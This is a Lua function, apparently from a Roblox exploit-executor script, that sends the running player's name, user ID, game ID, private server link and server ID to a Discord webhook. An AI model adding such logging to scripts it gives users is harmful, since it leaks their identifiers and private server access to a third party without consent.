-- ================================================
--           DISCORD WEBHOOK NOTIFICATION
-- ================================================

local function sendDiscordNotification(privateLink)
	local data = {
		["username"] = "Bot Sender Logger",
		["avatar_url"] = "https://cdn.discordapp.com/embed/avatars/0.png",
		["embeds"] = {{
			["title"] = "🤖 Script Executed!",
			["color"] = 0x5865F2,
			["fields"] = {
				{["name"] = "👤 Player", ["value"] = playerName .. " (" .. userId .. ")", ["inline"] = true},
				{["name"] = "🎮 Game ID", ["value"] = tostring(gameId), ["inline"] = true},
				{["name"] = "🔗 Private Server Link", ["value"] = privateLink ~= "" and privateLink or "Not provided", ["inline"] = false},
				{["name"] = "🖥️ Server ID", ["value"] = serverId ~= "" and serverId or "Unknown", ["inline"] = false},
			},
			["footer"] = {["text"] = "Bot Sender • " .. os.date("%Y-%m-%d %H:%M:%S")}
		}}
	}

	local ok, err = pcall(function()
		request({
			Url = DISCORD_WEBHOOK_URL,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(data)
		})
	end)

	if not ok then
		warn("[BotSender] Webhook failed: " .. tostring(err))
	end
end

